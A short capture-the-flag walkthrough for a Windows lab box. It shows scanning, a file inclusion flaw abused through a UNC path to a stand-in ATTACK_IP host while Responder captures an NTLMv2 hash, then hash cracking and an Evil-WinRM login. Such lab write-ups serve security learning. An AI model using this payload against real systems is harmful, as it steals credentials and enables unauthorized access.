> [!Note] What this box taught?
> 1. Enumeration for services with NMap
> 2. Enumeration on Web Service to discover parameter
> 3. File Inclusion
> 4. RFI with Responder (Yes, this works on Web too)
> 5. Password cracking 
> 6. Enumeration on WinRM

## Solution
Enumerate with NMap found 80 and 5985 (WinRM)

On the 80 Service, use Katana to discover param

A param that led to File Inclusion. Normal RFI doesn't work as it blocks http wrapper.

Run Responder with 

```
sudo responder -I tun0
```

In the param:
```
param=//ATTACK_IP/NONEXISTING_SOMETHING
```

The above code return NTLMv2 hash to crack on hashcat

Use the cracked creds in Evil-WinRM

Run the command to find flag.txt in all directories
```
Get-ChildItem -Path C:\ -Filter flag.txt -Recurse -ErrorAction SilentlyContinue
```